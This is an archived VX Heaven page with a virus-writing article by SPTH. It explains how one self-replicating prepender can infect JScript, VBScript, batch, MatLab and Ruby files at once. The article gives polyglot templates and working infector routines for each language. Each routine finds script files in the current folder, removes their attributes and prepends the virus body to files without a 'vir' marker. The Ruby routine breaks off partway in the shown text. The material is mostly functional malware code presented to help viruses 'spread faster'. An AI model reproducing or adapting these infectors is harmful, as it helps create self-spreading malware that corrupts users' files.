<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> SPTH 'Cross Script Infection using the same code' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="SPTH"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, SPTH,Cross Script Infection using the same code, ruby, matlab, code, trick, batch, line, vbscript, write, string, lines, invalid, show, target, jscript, file"/>
<meta name="Description" content="Cross infection gives us the possibility to reach more targets, thus spread faster. There are two ways how it can be done: Adjusting the code for each platform, or using a code that can run natively on each platfoms.In this text I show some ways to target different scripting languages by using the same code. The advantage is that one doesnt need to adjust the code for every new target, thus the infection is much easier, smaller and more beautiful :-)"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"1e0c44dfa14c382ea5a3765ae78e4e7e97729ff4-1498757759-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vsp43.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Cross Script Infection using the same code</h1><p><a href="/lib/?lang=en&amp;author=SPTH"> SPTH</a><br/> <em><a href="/vx.php?fid=2008#f2008">Valhalla #2</a></em><br/> <em>August 2011</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vsp43.html';</script><div class="ci"><a href="/lib/?ci=vsp43">1</a></div>[<a style="" href="/lib/?lang=EN&amp;index=MA#vsp43">Back to index</a>] [<a href="/lib/vsp43.html#disqus_thread">Comments</a>]<br/> 
<ul>
<li><a href="#c1">1) Introduction</a></li>
<li><a href="#c2">2) Infection strategy</a>
<ul>
<li><a href="#c21">2.1) JScript + BATch</a></li>
<li><a href="#c22">2.2) JScript + VBScript</a></li>
<li><a href="#c23">2.3) JScript + VBScript + BATch</a></li>
<li><a href="#c24">2.4) JScript + VBScript + BATch + MatLab</a></li>
<li><a href="#c25">2.5) Ruby + JScript</a></li>
<li><a href="#c26">2.6) Ruby + BATch + MatLab</a></li>
</ul></li>
<li><a href="#c3">3) Code snippets</a>
<ul>
<li><a href="#c31">3.1) JScript code</a></li>
<li><a href="#c32">3.2) VBScript code</a></li>
<li><a href="#c33">3.3) BATch code</a></li>
<li><a href="#c34">3.4) MatLab code</a></li>
<li><a href="#c35">3.5) Ruby code</a></li>
</ul></li>
<li><a href="#c4">4) Full infectors</a>
<ul>
<li><a href="#c41">4.1) JS/VBS/BATch/MatLab infector</a></li>
<li><a href="#c42">4.2) Ruby/JScript infector</a></li>
<li><a href="#c43">4.3) Ruby/BATch/MatLab infector</a></li>
</ul></li>
<li><a href="#c5">5) Conclusion</a></li>
</ul>
<h2><a name="c1"></a>1) Introduction</h2>
<p>Cross infection gives us the possibility to reach more targets, thus spread faster. There are two ways how it can be done: Adjusting the code for each platform, or using a code that can run natively on each platfoms.</p>
<p>In this text I show some ways to target different scripting languages by using the same code. The advantage is that one doesnt need to adjust the code for every new target, thus the infection is much easier, smaller and more beautiful :-)</p>
<p>I show the principial idea first, and later the actual code; if you want to write such codes, I suggest you to write down such plans, this helps alot :-)</p>
<h2><a name="c2"></a>2) Infection strategy</h2>
<h3><a name="c21"></a>2.1) JScript + BATch</h3>
<p>In 2003, I've written an article "<a href="/lib/vsp01.html">Cross Infection in JavaScript</a>" in <a href="/vx.php?fid=1225#f1225">rRlf#4</a>, which shows a trick to infect a JS and BAT files with the same code. The code could look like this:</p>
<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #006600; font-style: italic;">/*<br/>
goto bat<br/>
*/</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#91;</span>JScript code<span style="color: black;">&#93;</span><br/>
<span style="color: #006600; font-style: italic;">/*<br/>
:bat<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [BATch code]<br/>
*/</span><br/>
&nbsp;</div>
<p>It takes advantage of the forgiving BAT interpreter - the interpreter just ignores lines with errors.</p>
<h3><a name="c22"></a>2.2) JScript + VBScript</h3>
<p>In 2005, roy g biv published an article "<a href="/lib/vrg18.html">Cross-scripting attacks</a>" in <a href="/vx.php?fid=1413#f1413">rRlf#6</a>, which used a new trick to execute the same code in JScript and VBScript:</p>
<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">rem<span style="color: #339933;">=</span><span style="color: #CC0000;">1</span><span style="color: #339933;">;</span> <span style="color: black;">&#91;</span>JScript code<span style="color: black;">&#93;</span> <span style="color: #006600; font-style: italic;">/*<br/>
[VBS code]:rem*/</span><br/>
&nbsp;</div>
<p>It uses the different property of "REM" - for a VBS interpreter, it is a simple comment, and the rest of the line will be ignored. For the JScript interpreter, it is a simple variable definition.</p>
<h3><a name="c23"></a>2.3) JScript + VBScript + BATch</h3>
<p>We can combine the two old techniques, add a small new trick and we are ready. One VBScript property makes it harder: '%' is an invalid character for the VBS interpreter, but need to be used in BATch. The working solution could look like this:</p>
<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">rem<span style="color: #339933;">=</span><span style="color: #CC0000;">1</span><span style="color: #339933;">;</span> <span style="color: black;">&#91;</span>JScript code<span style="color: black;">&#93;</span> <span style="color: #006600; font-style: italic;">/*<br/>
[VBS code]<br/>
'&amp;[BAT code]&amp;*/</span><br/>
cls<span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;&quot;</span><br/>
&nbsp;</div>
<p>Again we use the fact that "rem" is a comment for VBScript (and BATch), and that the BATch interpreter ignores errors (such as the [VBS code], We also use the "&amp;" character to combine BATch lines to single lines. The first letter of the 3rd line is another comment-instruction for VBScript, thus this line will be ignored.</p>
<p>The last line is just a small addon, it is a valid variable definition in JS and VBS, and clears the screen in BATch.</p>
<h3><a name="c24"></a>2.4) JScript + VBScript + BATch + MatLab</h3>
<p>I have MatLab here, so why not add this to the target list, too? :-) MatLab's single-line comments are "%" (there is a multiline comment %{ %}, but this has to be the first instruction in a line, so it cant be used here).</p>
<p>MatLab let's see the template:</p>
<div class="javscript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">rem=4%2; [JScript code] /*<br/>
'';[MatLab code]; if 0<br/>
[VBS code]<br/>
'';end;%%&amp;[BAT code]&amp;*/<br/>
&nbsp;</div>
<p>First line: "rem" is a comment for VBS+BAT; "rem=4%" is a valid variable definition for MatLab followed by a single-line comment (thus ignoring the rest of the line). "rem=4%2;" is a valid variable definition for JScript, using the modulo operation.</p>
<p>Second line starts with a '', which indicates a single-line comment for VBS and a valid empty string for MatLab. In the end of that line there is an condition which is always false, so until the branch is closed (in line 4), the content in between (VBS code) will be ignored by MatLab.</p>
<p>The 4th line starts with the '' VBS comment again, and ends the MatLab if-branch from the 2nd line; then there is a Matlab comment-indicator "%". It is written twice, as the "%" is a indicator for a variable in BATch - and would cause a fatal error when its not closed. %% is a valid empty variable, thus the BATch code works.</p>
<h3><a name="c25"></a>2.5) Ruby + JScript</h3>
<p>We try Ruby next (for infos about Ruby viruses, see my article "<a href="/lib/vsp20.html">RUBY Virus Writing Guide</a>" in <a href="/vx.php?fid=1388#f1388">29a#8</a>). It's far more restrict due to several counter-properties:</p>
<ul>
<li>The multi-line comment needs to be in an empty line, thus can't be used as other interpreters will show errors.</li>
<li>The single-line comment '#' is an invalid character in JScript, VBScript and MatLab.</li>
<li>The JScript multi-line comment '/* */' is recognized as an incomplete regular expression by Ruby interpreters.</li>
<li>JScript single-line '//' comment is invalid MatLab</li>
<li>Ruby's instruction parser is more restrictive than MatLab's or JScript's one - even in parts that cant be reached in runtime.</li>
</ul>
<p>Still with a little trick, one can run a code in both Ruby+JScript.</p>
<div class="ruby" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color:#006600; font-weight:bold;">//</span>; <span style="color: black;">&#91;</span>Ruby code<span style="color: black;">&#93;</span>; <span style="color:#9966CC; font-weight:bold;">if</span> <span style="color:#0000FF; font-weight:bold;">nil</span><br/>
<span style="color:#CC0066; font-weight:bold;">eval</span><span style="color: black;">&#40;</span><span style="color:#996600;">'[JScript code*]'</span><span style="color: black;">&#41;</span>;<span style="color:#006600; font-weight:bold;">//</span>;<span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp;</div>
<p>*) The JScript must not contain further ' (chr(39)), just " (chr(34)).</p>
<p>The trick is: eval is an instruction that executes string-expressions in JScript and Ruby, as the string is not parsed before runtime, it works for both platforms.</p>
<p>Second trick is: '//' is a non-invalid instruction in Ruby, and a comment in JScript.</p>
<h3><a name="c26"></a>2.6) Ruby + BATch + MatLab</h3>
<p>It seems to be not possible to write a virus infecting all together:</p>
<p>Ruby + (JScript | VBScript) + MatLab</p>
<p>due to the problems mentioned above. So we can ommit JS/VBS, and infect the remaining targets.</p>
<div class="ruby" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">rem <span style="color:#006666;">4</span><span style="color:#006600; font-weight:bold;">%</span>2; <span style="color: black;">&#91;</span>Ruby code<span style="color: black;">&#93;</span>; <span style="color:#9966CC; font-weight:bold;">if</span> <span style="color:#0000FF; font-weight:bold;">nil</span><br/>
<span style="color:#CC0066; font-weight:bold;">eval</span><span style="color: black;">&#40;</span>char<span style="color: black;">&#40;</span> <span style="color: black;">&#91;</span>ML code<span style="color:#006600; font-weight:bold;">*</span><span style="color: black;">&#93;</span> <span style="color: black;">&#41;</span><span style="color: black;">&#41;</span>;<br/>
<span style="color:#006600; font-weight:bold;">%</span>w<span style="color: black;">&#91;</span><span style="color: black;">&#93;</span>;<span style="color:#006600; font-weight:bold;">%</span>w<span style="color: black;">&#91;</span><span style="color: black;">&#93;</span>;<span style="color:#9966CC; font-weight:bold;">end</span>;<span style="color: black; font-style: italic;">#&amp; [BAT code]</span><br/>
&nbsp;</div>
<p>3rd line "%w[];%w[]" is a comment for MatLab, an non-invalid instruction for BATch (as there are two %'s), and an empty array in Ruby. (could have been "a=4%2;a=4%2", but this is 2 bytes smaller :-) )</p>
<h2><a name="c3"></a>3) Code snippets</h2>
<h3><a name="c31"></a>3.1) JScript code</h3>
<p>In the final version, the JScript code is written as a single line, the lines are connected via ";". Here the readable version:</p>
<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">a<span style="color: #339933;">=</span><span style="color: #000066; font-weight: bold;">new</span> ActiveXObject<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;scripting.filesystemobject&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: #000066; font-weight: bold;">for</span><span style="color: black;">&#40;</span>d<span style="color: #339933;">=</span><span style="color: #000066; font-weight: bold;">new</span> Enumerator<span style="color: black;">&#40;</span>a.<span style="color: #660066;">getfolder</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;.&quot;</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">files</span><span style="color: black;">&#41;</span><span style="color: #339933;">;!</span>d.<span style="color: #660066;">atEnd</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>d.<span style="color: #660066;">moveNext</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; f<span style="color: #339933;">=</span>a.<span style="color: #660066;">getextensionname</span><span style="color: black;">&#40;</span>e<span style="color: #339933;">=</span>d.<span style="color: #660066;">item</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">toLowerCase</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>f<span style="color: #339933;">==</span><span style="color: #3366CC;">&quot;js&quot;</span><span style="color: #339933;">||</span>f<span style="color: #339933;">==</span><span style="color: #3366CC;">&quot;vbs&quot;</span><span style="color: #339933;">||</span>f<span style="color: #339933;">==</span><span style="color: #3366CC;">&quot;bat&quot;</span><span style="color: #339933;">||</span>f<span style="color: #339933;">==</span><span style="color: #3366CC;">&quot;m&quot;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">try</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; f<span style="color: #339933;">=</span>a.<span style="color: #660066;">getfile</span><span style="color: black;">&#40;</span>e<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; g<span style="color: #339933;">=</span>f.<span style="color: #660066;">attributes</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; f.<span style="color: #660066;">attributes</span><span style="color: #339933;">=</span><span style="color: #CC0000;">0</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; b<span style="color: #339933;">=</span>a.<span style="color: #660066;">opentextfile</span><span style="color: black;">&#40;</span>e<span style="color: black;">&#41;</span>.<span style="color: #660066;">readall</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>b.<span style="color: #660066;">search</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;vir&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">&lt;</span><span style="color: #CC0000;">0</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; a.<span style="color: #660066;">opentextfile</span><span style="color: black;">&#40;</span>e<span style="color: #339933;">,</span><span style="color: #CC0000;">2</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">write</span><span style="color: black;">&#40;</span>a.<span style="color: #660066;">opentextfile</span><span style="color: black;">&#40;</span>WScript.<span style="color: #660066;">scriptfullname</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">readall</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">substr</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">0</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span>VIRUS_SIZE<span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: #339933;">+</span>b<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; f.<span style="color: #660066;">attributes</span><span style="color: #339933;">=</span>g<span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">catch</span><span style="color: black;">&#40;</span>z<span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><span style="color: black;">&#125;</span><br/>
<span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<p>(Big) parts of the code is used from roy g biv's JS/VBS.ACDC (in <a href="/vx.php?fid=1413#f1413">rRlf#6</a>), however this code is a prepender and his code was an appender.</p>
<h3><a name="c32"></a>3.2) VBScript code</h3>
<p>The VBS code is combined to a single line too, using ':'. Here the non-optimized version:</p>
<div class="vb" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #151B8D; font-weight: bold;">on</span> <span style="color: #151B8D; font-weight: bold;">error</span> <span style="color: #151B8D; font-weight: bold;">resume</span> <span style="color: #8D38C9; font-weight: bold;">next</span><br/>
<span style="color: #151B8D; font-weight: bold;">set</span> a=<span style="color: #E56717; font-weight: bold;">createobject</span>(<span style="color: #800000;">&quot;scripting.filesystemobject&quot;</span>)<br/>
<span style="color: #151B8D; font-weight: bold;">set</span> d=a.getfolder(<span style="color: #800000;">&quot;.&quot;</span>)<br/>
<span style="color: #8D38C9; font-weight: bold;">for</span> <span style="color: #8D38C9; font-weight: bold;">each</span> e <span style="color: #8D38C9; font-weight: bold;">in</span> d.files<br/>
&nbsp; &nbsp; f=lcase(a.getextensionname(e))<br/>
&nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> f=<span style="color: #800000;">&quot;js&quot;</span><span style="color: #8D38C9; font-weight: bold;">or</span> f=<span style="color: #800000;">&quot;vbs&quot;</span> <span style="color: #8D38C9; font-weight: bold;">or</span> f=<span style="color: #800000;">&quot;bat&quot;</span> <span style="color: #8D38C9; font-weight: bold;">or</span> f=<span style="color: #800000;">&quot;m&quot;</span><span style="color: #8D38C9; font-weight: bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; f=e.attributes:e.attributes=0<br/>
&nbsp; &nbsp; &nbsp; &nbsp; b=a.opentextfile(e).readall<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">if</span> instr(b,<span style="color: #800000;">&quot;vir&quot;</span>)=0then<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; a.opentextfile(e,2).write mid(a.opentextfile(wscript.scriptfullname).readall,1,[VIRUS_SIZE])+b<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; e.attributes=f<br/>
&nbsp; &nbsp; <span style="color: #8D38C9; font-weight: bold;">end</span> <span style="color: #8D38C9; font-weight: bold;">if</span><br/>
<span style="color: #8D38C9; font-weight: bold;">next</span><br/>
&nbsp;</div>
<p>Again, (big) parts of this code is from roy g biv's JS/VBS.ACDC from <a href="/vx.php?fid=1413#f1413">rRlf#6</a>, but this one is a prepender and his ACDC is an appender.</p>
<h3><a name="c33"></a>3.3) BATch code</h3>
<p>The BATch part is also a single line; the lines are combined using "&amp;" characters. For better understanding, here the long version:</p>
<div class="dos" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><a style="color: #000060;" href="http://www.ss64.com/nt/for.html"><span style="color: #00b100; font-weight: bold;">for</span></a> <span style="color: #33cc33;">%%</span><span style="color: #448888;">a</span> <a style="color: #000060;" href="http://www.ss64.com/nt/in.html"><span style="color: #00b100; font-weight: bold;">in</span></a> <span style="color: #33cc33;">(</span>*.js *.vbs *.bat *.m<span style="color: #33cc33;">)</span> <a style="color: #000060;" href="http://www.ss64.com/nt/do.html"><span style="color: #00b100; font-weight: bold;">do</span></a> <span style="color: #33cc33;">(</span><br/>
&nbsp; &nbsp; find &quot;vir&quot; <span style="color: #33cc33;">%%</span><span style="color: #448888;">a</span><br/>
&nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/if.html"><span style="color: #00b100; font-weight: bold;">if</span></a> <a style="color: #000060;" href="http://www.ss64.com/nt/errorlevel.html"><span style="color: #000000; font-weight: bold;">ERRORLEVEL</span></a> 1 find &quot;vir&quot;<span style="color: #33cc33;">&lt;%</span><span style="color: #448888;">0</span><span style="color: #33cc33;">&gt;</span>a<br/>
&nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/copy.html"><span style="color: #b1b100; font-weight: bold;">copy</span></a> a /b + <span style="color: #33cc33;">%%</span><span style="color: #448888;">a</span> /b b<br/>
&nbsp; &nbsp; <a style="color: #000060;" href="http://www.ss64.com/nt/move.html"><span style="color: #b1b100; font-weight: bold;">move</span></a> /y b <span style="color: #33cc33;">%%</span><span style="color: #448888;">a</span><br/>
<span style="color: #33cc33;">)</span><br/>
<a style="color: #000060;" href="http://www.ss64.com/nt/del.html"><span style="color: #b1b100; font-weight: bold;">del</span></a> a b<br/>
cls<br/>
&nbsp;</div>
<p>A simple prepender which searchs for the virus-mark "vir" and infects other files using two temp-files (a b).</p>
<h3><a name="c34"></a>3.4) MatLab code</h3>
<p>Also the MatLab code is single-lined, using ";". Here the long version:</p>
<div class="matlab" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">a=<a style="color: #000060;" href="http://www.mathworks.com/access/helpdesk/help/techdoc/ref/fopen.html"><span style="color: #0000FF;">fopen</span></a><span style="color: black;">&#40;</span><span style="color: black;">&#91;</span>mfilename <span style="color:#A020F0;">'.m'</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span>;<br/>
b=<span style="color: black;">&#91;</span><a style="color: #000060;" href="http://www.mathworks.com/access/helpdesk/help/techdoc/ref/char.html"><span style="color: #0000FF;">char</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://www.mathworks.com/access/helpdesk/help/techdoc/ref/fread.html"><span style="color: #0000FF;">fread</span></a><span style="color: black;">&#40;</span>a,<span style="color: black;">&#91;</span>VIRUS_SIZE<span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#93;</span>'<br/>
<a style="color: #000060;" href="http://www.mathworks.com/access/helpdesk/help/techdoc/ref/fclose.html"><span style="color: #0000FF;">fclose</span></a><span style="color: black;">&#40;</span>a<span style="color: black;">&#41;</span>;<br/>
c=<span style="color: black;">&#123;</span><span style="color:#A020F0;">'*.js'</span>,<span style="color:#A020F0;">'*.vbs'</span>,<span style="color:#A020F0;">'*.bat'</span>,<span style="color:#A020F0;">'*.m'</span><span style="color: black;">&#125;</span>;<br/>
<span style="color: #0000FF;">for</span> d=<span style="color: #33f;">1</span>:<a style="color: #000060;" href="http://www.mathworks.com/access/helpdesk/help/techdoc/ref/length.html"><span style="color: #0000FF;">length</span></a><span style="color: black;">&#40;</span>c<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; e=<a style="color: #000060;" href="http://www.mathworks.com/access/helpdesk/help/techdoc/ref/dir.html"><span style="color: #0000FF;">dir</span></a><span style="color: black;">&#40;</span>c<span style="color: black;">&#123;</span>d<span style="color: black;">&#125;</span><span style="color: black;">&#41;</span>;<br/>
&nbsp; &nbsp; <span style="color: #0000FF;">for</span> f=<span style="color: #33f;">1</span>:<a style="color: #000060;" href="http://www.mathworks.com/access/helpdesk/help/techdoc/ref/length.html"><span style="color: #0000FF;">length</span></a><span style="color: black;">&#40;</span>e<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; g=<a style="color: #000060;" href="http://www.mathworks.com/access/helpdesk/help/techdoc/ref/fopen.html"><span style="color: #0000FF;">fopen</span></a><span style="color: black;">&#40;</span>e<span style="color: black;">&#40;</span>f<span style="color: black;">&#41;</span>.<span style="">name</span>,<span style="color:#A020F0;">'r+'</span><span style="color: black;">&#41;</span>;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; h=<a style="color: #000060;" href="http://www.mathworks.com/access/helpdesk/help/techdoc/ref/fread.html"><span style="color: #0000FF;">fread</span></a><span style="color: black;">&#40;</span>g,<span style="color:#A020F0;">'*char'</span><span style="color: black;">&#41;</span>';<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.mathworks.com/access/helpdesk/help/techdoc/ref/frewind.html"><span style="color: #0000FF;">frewind</span></a><span style="color: black;">&#40;</span>g<span style="color: black;">&#41;</span>;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000FF;">if</span> isempty<span style="color: black;">&#40;</span>strfind<span style="color: black;">&#40;</span>h,<span style="color:#A020F0;">'vir'</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.mathworks.com/access/helpdesk/help/techdoc/ref/fwrite.html"><span style="color: #0000FF;">fwrite</span></a><span style="color: black;">&#40;</span>g,<span style="color: black;">&#91;</span>b h<span style="color: black;">&#93;</span><span style="color: black;">&#41;</span>;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000FF;">end</span>;<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.mathworks.com/access/helpdesk/help/techdoc/ref/fclose.html"><span style="color: #0000FF;">fclose</span></a><span style="color: black;">&#40;</span>g<span style="color: black;">&#41;</span>;<br/>
&nbsp; &nbsp; <span style="color: #0000FF;">end</span>;<br/>
<span style="color: #0000FF;">end</span>;<br/>
&nbsp;</div>
<p>Simple and optimized :)</p>
<h3><a name="c35"></a>3.5) Ruby code</h3>
<p>Readable form of the Ruby infector, which's lines are combined with ';' in the actual virus.</p>
<div class="ruby" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">a=<span style="color:#CC00FF; font-weight:bold;">File</span>.<span style="color:#CC0066; font-weight:bold;">open</span><span style="color: black;">&#40;</span><span style="color:#0000FF; font-weight:bold;">__FILE__</span><span style="color: black;">&#41;</span>;<br/>
b=a.<span style="color:#9900CC;">read</span><span style="color: black;">&#40;</span><span style="color: black;">&#91;</span>VIRUS_SIZE<span style="color: black;">&#93;</span><span style="color: black;">&#41;</span>;<br/>
a.<span style="color:#9900CC;">close</span>;<br/>
c=<span style="color:#CC00FF; font-weight:bold;">Dir</span>.<span style="color:#CC0066; font-weight:bold;">open</span><span style="color: black;">&#40;</span><span style="color:#CC00FF; font-weight:bold;">Dir</span>.<span style="color:#9900CC;">getwd</span><span style="color: black;">&#41;</span>;<br/>
c.<span style="color:#9900CC;">each</span> <span style="color:#9966CC; font-weight:bold;">do</span> <span style="color:#006600; font-weight:bold;">|</span>d<span style="color:#006600; font-weight:bold;">|</span><br/>
&nbsp; &nbsp; e=<span style="color:#CC00FF; font-weight:bold;">File</span>.<span style="color:#9900CC;">extname</span><span style="color: black;">&#40;</span>d<span style="color: black;">&#41;</span>;<br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> <span style="color:#CC00FF; font-weight:bold;">File</span>.<span style="color:#9900CC;">ftype</span><span style="color: black;">&#40;</span>d<span style="color: black;">&#41;</span>==<span style="color:#996600;">&quot;file&quot;</span> <span style="color:#006600; font-weight:bold;">&amp;&amp;</span> <span style="color: black;">&#40;</span>e==<span style="color:#996600;">&quot;.bat&quot;</span><span style="color:#006600; font-weight:bold;">||</span>e==<span style="color:#996600;">&quot;.m&quot;</span><span style="color:#006600; font-weight:bold;">||</span>e==<span style="color:#996600;">&quot;.rb&quot;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; f=<span style="color:#CC00FF; font-weight:bold;">File</span>.<span style="color:#CC0066; font-weight:bold;">open</span><span style="color: black;">&#40;</span>d,<span style="color:#996600;">&quot;r+&quot;</span><span style="color: black;">&#41;</span>;<br/>
